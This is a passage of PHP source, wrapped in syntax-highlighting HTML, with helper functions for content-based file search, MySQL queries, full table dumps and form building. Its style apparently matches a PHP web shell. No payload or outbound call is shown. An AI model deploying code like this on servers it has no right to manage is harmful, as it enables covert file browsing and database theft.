#2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">re<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ( <span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_match(<\/span><span style=\"color: #66cccc;\">'@'<\/span>.$<span style=\"color: #ffcc66;\">content<\/span>.<span style=\"color: #66cccc;\">'@'<\/span>,$<span style=\"color: #ffcc66;\">file<\/span>) || <span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_match(<\/span><span style=\"color: #66cccc;\">'@'<\/span>.$<span style=\"color: #ffcc66;\">c<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ontent<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'@'<\/span><span style=\"text-decoration: underline;\">, @<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">file_get_contents(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">f<\/span><span style=\"text-decoration: underline;\">)) ){<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">find<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ( <span style=\"color: #cccccc; background-color: #2d2d2d;\">strstr(<\/span>$<span style=\"color: #ffcc66;\">file<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>) || <span style=\"color: #cccccc; background-color: #2d2d2d;\">strstr(<\/span> @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span>$<span style=\"color: #ffcc66; text-decoration: underline;\">f<\/span><span style=\"text-decoration: underline;\">),$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">content<\/span><span style=\"text-decoration: underline;\"> ) ) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">find<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">find<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'filename'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>,<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'size'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'mtime'<\/span>]=<span style=\"color: #99cc99;\">@date<\/span>(<span style=\"color: #66cccc;\">'Y-m-d H:i:s'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'filechmod'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'fileperm'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getPerms(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'fileowner'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getUser(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'dirlink'<\/span>]=$<span style=\"color: #ffcc66;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'server_link'<\/span>]=$<span style=\"color: #ffcc66;\">f<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">j<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">closedir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">clearstatcache(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">filedata<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">qy<\/span>($<span style=\"color: #ffcc66;\">sql<\/span>) {<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">mysqllink<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">echo $sql.'&lt;br&gt;';<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = $<span style=\"color: #ffcc66;\">error<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #ffcc66;\">res<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_query(<\/span>$<span style=\"color: #ffcc66;\">sql<\/span>,$<span style=\"color: #ffcc66;\">mysqllink<\/span>)) {<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_resource(<\/span>$<span style=\"color: #ffcc66;\">res<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #f2777a; background-color: #515151;\">   <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">q<\/span>($<span style=\"color: #ffcc66;\">sql<\/span>) {<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">mysqllink<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_query(<\/span>$<span style=\"color: #ffcc66;\">sql<\/span>,$<span style=\"color: #ffcc66;\">mysqllink<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">fr<\/span>($<span style=\"color: #ffcc66;\">qy<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_free_result(<\/span>$<span style=\"color: #ffcc66;\">qy<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">sizecount<\/span>($<span style=\"color: #ffcc66;\">fileSize<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">size<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">sprintf(<\/span><span style=\"color: #66cccc;\">\"%u\"<\/span>, $<span style=\"color: #ffcc66;\">fileSize<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">size<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">'0 Bytes'<\/span> ;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">sizename<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">' Bytes'<\/span>, <span style=\"color: #66cccc;\">' KB'<\/span>, <span style=\"color: #66cccc;\">' MB'<\/span>, <span style=\"color: #66cccc;\">' GB'<\/span>, <span style=\"color: #66cccc;\">' TB'<\/span>, <span style=\"color: #66cccc;\">' PB'<\/span>, <span style=\"color: #66cccc;\">' EB'<\/span>, <span style=\"color: #66cccc;\">' ZB'<\/span>,<span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' YB'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">round(<\/span> $<span style=\"color: #ffcc66;\">size<\/span> \/ <span style=\"color: #cccccc; background-color: #2d2d2d;\">pow(1024<\/span>, ($<span style=\"color: #ffcc66;\">i<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">floor(log(<\/span>$<span style=\"color: #ffcc66;\">size<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">1024<\/span>)))), <span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>) . $<span style=\"color: #ffcc66;\">sizen<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ame<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">i<\/span><span style=\"text-decoration: underline;\">];<\/span>\n}\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#22791;&#20221;&#25968;&#25454;&#24211;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">sqldumptable<\/span>($<span style=\"color: #ffcc66;\">table<\/span>, $<span style=\"color: #ffcc66;\">fp<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">mysqllink<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledump<\/span> = <span style=\"color: #66cccc;\">\"DROP TABLE IF EXISTS `$table`;\\n\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW CREATE TABLE $table\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">create<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_row(<\/span>$<span style=\"color: #ffcc66;\">res<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledump<\/span> .= $<span style=\"color: #ffcc66;\">create<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>].<span style=\"color: #66cccc;\">\";\\n\\n\"<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">fp<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,$<span style=\"color: #ffcc66;\">tabledump<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">tabledump<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledump<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rows<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SELECT * FROM $table\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">row<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_assoc(<\/span>$<span style=\"color: #ffcc66;\">rows<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">row<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">k<\/span>=&gt;$<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">row<\/span>[$<span style=\"color: #ffcc66;\">k<\/span>] = <span style=\"color: #66cccc;\">\"'\"<\/span>.@<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_real_escape_string(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>).<span style=\"color: #66cccc;\">\"'\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledump<\/span> = <span style=\"color: #66cccc;\">'INSERT INTO `'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>.<span style=\"color: #66cccc;\">'` VALUES ('<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">\", \"<\/span>, $<span style=\"color: #ffcc66;\">row<\/span>).<span style=\"color: #66cccc;\">');<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">fp<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,$<span style=\"color: #ffcc66;\">tabledump<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">tabledump<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,<span style=\"color: #66cccc;\">\"\\n\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fr(<\/span>$<span style=\"color: #ffcc66;\">rows<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">p<\/span>($<span style=\"color: #ffcc66;\">str<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">str<\/span>.<span style=\"color: #66cccc;\">\"\\n\"<\/span>;\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">tbhead<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\"&gt;'<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">tbfoot<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/table&gt;'<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">makehide<\/span>($<span style=\"color: #ffcc66;\">name<\/span>,$<span style=\"color: #ffcc66;\">value<\/span>=<span style=\"color: #66cccc;\">''<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" \/&gt;\"<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">makeinput<\/span>($<span style=\"color: #ffcc66;\">arg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'size'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'size'<\/span>] &gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> ? <span style=\"color: #66cccc;\">\"size=\\\"$arg[size]\\\"\"<\/span> : <span style=\"color: #66cccc;\">\"size=\\\"100\\\"\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'extra'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'extra'<\/span>] ? $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'extra'<\/span>] : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'type'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'type'<\/span>] = <span style=\"color: #66cccc;\">'text'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] ? $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>].<span style=\"color: #66cccc;\">'&lt;br \/&gt;'<\/span> : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'class'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'class'<\/span>] ? $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'class'<\/span>] : <span style=\"color: #66cccc;\">'input'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'newline'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;p&gt;$arg[title]&lt;input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$<\/span><span style=\"color: #66cccc; text-decoration: underline;\">arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] \/&gt;&lt;\/p&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"$arg[title]&lt;input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg<\/span><span style=\"color: #66cccc; text-decoration: underline;\">[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] \/&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">makeselect<\/span>($<span style=\"color: #ffcc66;\">arg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'onchange'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">onchange<\/span> = <span style=\"color: #66cccc;\">'onchange=\"'<\/span>.$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'onchange'<\/span>].<span style=\"color: #66cccc;\">'\"'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] ? $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'newline'<\/span>]) <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"$arg[title] &lt;select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> $onchange&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span 